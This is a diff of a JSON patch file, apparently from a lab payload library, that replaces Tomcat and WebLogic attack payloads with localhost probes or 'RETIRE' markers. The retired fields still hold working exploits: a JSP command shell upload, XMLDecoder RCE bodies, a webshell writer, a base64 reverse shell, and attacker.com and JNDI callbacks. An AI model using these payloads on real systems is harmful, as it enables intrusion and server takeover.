+          "expectedCommand": "# CVE-2017-12615\n# Windows下PUT方法写文件\nPUT /shell.jsp%20 HTTP/1.1\nHost: target\nContent-Length: 24\n\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n\n# 或使用::$DATA\nPUT /shell.jsp::$DATA HTTP/1.1\n\n# 或使用/\nPUT /shell.jsp/ HTTP/1.1",
+          "command": "curl --silent --show-error --max-time 5 -X OPTIONS \"http://127.0.0.1:18080/lab-static/\" -H \"X-Request-ID: tomcat-method-001\" -D - -o /dev/null | grep -Ei '^(HTTP/|Allow:)'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 不同文件名变体\nshell.jsp%20\nshell.jsp::$DATA\nshell.jsp/\nshell.jsp%00\nshell.jSp\nshell.jsP",
+          "command": "RETIRE tomcat-vuln JSP filename stream suffix null-byte and case bypasses"
+        }
+      ]
+    },
+    {
+      "id": "weblogic-iiop",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 扫描IIOP端口\tnmap -sV -p 7001 target\n\n# IIOP使用相同端口\n# 检测是否支持IIOP\n# 使用工具检测",
+          "command": "nmap -sV -Pn -p 17001 127.0.0.1 --version-light"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 使用weblogic_CVE_2020_2551\ngit clone https://github.com/Y4er/CVE-2020-2551\ncd CVE-2020-2551\n\n# 编译并运行\nmvn package\njava -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001\n\n# 使用JRMP监听\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}\"",
+          "command": "RETIRE weblogic-iiop CVE exploit repository JRMP listener and reverse-shell gadget"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 使用Python构造\n# 需要安装相关库\npip install idna\n\n# 使用JNDI注入\n# 构造恶意JNDI引用\nString jndiURL = \"iiop://attacker:1099/Exploit\";\nContext ctx = new InitialContext();\nctx.lookup(jndiURL);\n\n# 使用JNDIExploit工具\njava -jar JNDIExploit.jar -i attacker_ip",
+          "command": "RETIRE weblogic-iiop JNDI reference construction and exploit-service workflow"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 在T3和IIOP之间切换\n# 如果T3被禁用，尝试IIOP\n# 使用不同协议绕过检测",
+          "command": "RETIRE weblogic-iiop T3-IIOP protocol switching to evade inspection"
+        }
+      ]
+    },
+    {
+      "id": "weblogic-rce",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# XMLDecoder反序列化\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java>\n        <object class=\"java.lang.ProcessBuilder\">\n          <array class=\"java.lang.String\" length=\"3\">\n            <void index=\"0\"><string>/bin/bash</string></void>\n            <void index=\"1\"><string>-c</string></void>\n            <void index=\"2\"><string>id</string></void>\n          </array>\n          <void method=\"start\"/>\n        </object>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>",
+          "command": "RETIRE weblogic-rce XMLDecoder ProcessBuilder SOAP execution body"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 新版XMLDecoder绕过\nPOST /_async/AsyncResponseService HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\">\n  <soapenv:Header>\n    <wsa:Action>xx</wsa:Action>\n    <wsa:RelatesTo>xx</wsa:RelatesTo>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java class=\"java.beans.XMLDecoder\">\n        <void class=\"java.lang.ProcessBuilder\">\n          <array class=\"java.lang.String\" length=\"3\">\n            <void index=\"0\"><string>/bin/bash</string></void>\n            <void index=\"1\"><string>-c</string></void>\n            <void index=\"2\"><string>id</string></void>\n          </array>\n          <void method=\"start\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>",
+          "command": "RETIRE weblogic-rce asynchronous XMLDecoder ProcessBuilder execution body"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 未授权访问+命令执行\n# 登录绕过\nGET /console/css/%252e%252e%252fconsole.portal HTTP/1.1\n\n# 命令执行\nGET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1",
+          "command": "curl --silent --show-error --max-time 5 -I \"http://127.0.0.1:18080/console/login/LoginForm.jsp\" -H \"X-Request-ID: weblogic-console-001\" | grep -Ei '^(HTTP/|Location:|WWW-Authenticate:)'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 不同编码方式\n/console/css/..;/console.portal\n/console/css/%2e%2e/console.portal\n/console/css/%252e%252e/console.portal\n/console/css/..%252fconsole.portal",
+          "command": "RETIRE weblogic-rce encoded console traversal and login-policy bypass paths"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 使用不同XML标签\n<void class=\"java.lang.Runtime\" method=\"getRuntime\">\n<void method=\"exec\">\n<string>id</string>\n</void>\n</void>\n\n# 使用数组形式\n<array class=\"java.lang.String\" length=\"1\">\n<void index=\"0\"><string>id</string></void>\n</array>",
+          "command": "RETIRE weblogic-rce XML Runtime exec and command-array variants"
+        }
+      ]
+    },
+    {
+      "id": "weblogic-t3",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 扫描T3端口(默认7001)\nnmap -sV -p 7001 target\n\n# T3握手\necho \"t3 12.2.1\" | nc target 7001\n\n# 如果返回HELO则存在T3服务",
+          "command": "printf 't3 12.2.1\\nAS:255\\nHL:19\\n\\n' | nc -w 2 127.0.0.1 17001 | head -n 1"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 使用weblogic_exploit\ngit clone https://github.com/0xn0ne/weblogicScanner\ncd weblogicScanner\npython3 weblogic.py -t target -p 7001\n\n# 使用WebLogicTool\njava -jar WebLogicTool.jar -target target:7001 -cmd \"id\"\n\n# 使用ysoserial\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 \"touch /tmp/pwned\"",
+          "command": "RETIRE weblogic-t3 exploit scanners command execution and JRMP gadget workflow"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# Python脚本构造T3请求\nimport socket\nimport struct\n\ndef send_t3_payload(target, port, payload):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target, port))\n    \n    # T3握手\n    sock.send(b\"t3 12.2.1\\n\")\n    response = sock.recv(1024)\n    \n    # 发送恶意序列化对象\n    # 构造包含恶意对象的T3请求\n    sock.send(payload)\n    sock.close()\n\n# 使用ysoserial生成payload\n# java -jar ysoserial.jar CommonsCollections1 \"id\" > payload.bin",
+          "command": "docker exec weblogic-lab sh -lc \"grep -E 'ListenPort|ListenAddress|DefaultProtocol|IIOPEnabled' /u01/oracle/user_projects/domains/base_domain/config/config.xml\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 不同Gadget链\nCommonsCollections1\nCommonsCollections2\nCommonsCollections3\nCommonsCollections4\nCommonsBeanutils1\nJdk7u21\nJre8u20\n\n# 根据目标环境选择合适的链",
+          "command": "RETIRE weblogic-t3 gadget-chain selection list"
+        }
+      ]
+    },
+    {
+      "id": "weblogic-xmldecoder",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 检测WebLogic控制台\ncurl -sI \"http://target:7001/console/\" | head -5\n\n# 检测wls-wsat端点(CVE-2017-10271)\ncurl -s \"http://target:7001/wls-wsat/CoordinatorPortType\" | head -20\n\n# 检测AsyncResponseService端点(CVE-2019-2725)\ncurl -s \"http://target:7001/_async/AsyncResponseService\" | head -20\n\n# 检测T3协议\nnmap -sV -p 7001 --script weblogic-t3-info target",
+          "command": "for path in console/ wls-wsat/CoordinatorPortType _async/AsyncResponseService; do curl --silent --show-error --max-time 5 -o /dev/null -w \"$path %{http_code}\\n\" \"http://127.0.0.1:18080/$path\" -H \"X-Request-ID: weblogic-surface-001\"; done"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "curl -v \"http://target:7001/wls-wsat/CoordinatorPortType\"   -H \"Content-Type: text/xml\"   -d '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">\n        <void class=\"java.lang.ProcessBuilder\">\n          <array class=\"java.lang.String\" length=\"3\">\n            <void index=\"0\"><string>/bin/bash</string></void>\n            <void index=\"1\"><string>-c</string></void>\n            <void index=\"2\"><string>id > /tmp/test_rce.txt</string></void>\n          </array>\n          <void method=\"start\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>'",
+          "command": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/wls-wsat/CoordinatorPortType\" -H \"Content-Type: text/xml\" -H \"X-Request-ID: weblogic-workcontext-001\" --data '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:work=\"http://bea.com/2004/06/soap/workarea/\" xmlns:lab=\"urn:payloader:lab\"><soapenv:Header><work:WorkContext><lab:marker>WEBLOGIC_XML_CANARY_A1</lab:marker></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>' -o /dev/null -w '%{http_code}\\n'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "curl -v \"http://target:7001/_async/AsyncResponseService\"   -H \"Content-Type: text/xml\"   -d '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n  <soapenv:Header>\n    <wsa:Action>xx</wsa:Action>\n    <wsa:RelatesTo>xx</wsa:RelatesTo>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <void class=\"java.lang.ProcessBuilder\">\n        <array class=\"java.lang.String\" length=\"3\">\n          <void index=\"0\"><string>/bin/bash</string></void>\n          <void index=\"1\"><string>-c</string></void>\n          <void index=\"2\"><string>curl http://attacker.com/callback?rce=success</string></void>\n        </array>\n        <void method=\"start\"/>\n      </void>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>\n</soapenv:Envelope>'",
+          "command": "RETIRE weblogic-xmldecoder asynchronous ProcessBuilder callback body"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 通过XMLDecoder写入JSP Webshell\ncurl \"http://target:7001/wls-wsat/CoordinatorPortType\"   -H \"Content-Type: text/xml\"   -d '<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8.0\" class=\"java.beans.XMLDecoder\">\n        <void class=\"java.io.PrintWriter\">\n          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>\n          <void method=\"println\">\n            <string><![CDATA[<%if(\"test\".equals(request.getParameter(\"pwd\"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>\n          </void>\n          <void method=\"close\"/>\n        </void>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>'\n\n# 验证Webshell\ncurl \"http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id\"",
+          "command": "RETIRE weblogic-xmldecoder persistent JSP webshell write and invocation workflow"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 尝试不同的XMLDecoder入口\ncurl -H \"Content-Type: text/xml\" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType\ncurl -H \"Content-Type: text/xml\" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11\ncurl -H \"Content-Type: text/xml\" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType\ncurl -H \"Content-Type: text/xml\" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC\ncurl -H \"Content-Type: text/xml\" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType",
+          "command": "for path in wls-wsat/CoordinatorPortType wls-wsat/CoordinatorPortType11 wls-wsat/ParticipantPortType; do curl --silent --show-error --max-time 5 -X OPTIONS \"http://127.0.0.1:18080/$path\" -H \"X-Request-ID: weblogic-endpoint-001\" -o /dev/null -w \"$path %{http_code}\\n\"; done"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# T3协议利用（绕过HTTP层WAF）\npython3 weblogic_t3_exploit.py -t target:7001 -c \"id\"\n\n# IIOP协议利用\npython3 weblogic_iiop_exploit.py -t target:7001 -c \"whoami\"\n\n# 使用ysoserial生成T3 payload\njava -jar ysoserial.jar CommonsCollections1 \"touch /tmp/test\" | python3 t3_send.py target 7001",
+          "command": "RETIRE weblogic-xmldecoder T3-IIOP exploit and serialized gadget delivery workflow"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<!-- UTF-16编码绕过 -->\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<!-- CDATA包裹关键字 -->\n<java>\n  <object class=\"java.lang.ProcessBuilder\">\n    <array class=\"java.lang.String\" length=\"3\">\n      <void index=\"0\"><string><![CDATA[/bin/sh]]></string></void>\n      <void index=\"1\"><string><![CDATA[-c]]></string></void>\n      <void index=\"2\"><string><![CDATA[id]]></string></void>\n    </array>\n    <void method=\"start\"/>\n  </object>\n</java>",
+          "command": "RETIRE weblogic-xmldecoder UTF-16 CDATA and ProcessBuilder XML evasion body"
+        }
+      ]
+    }
+  ]
+}
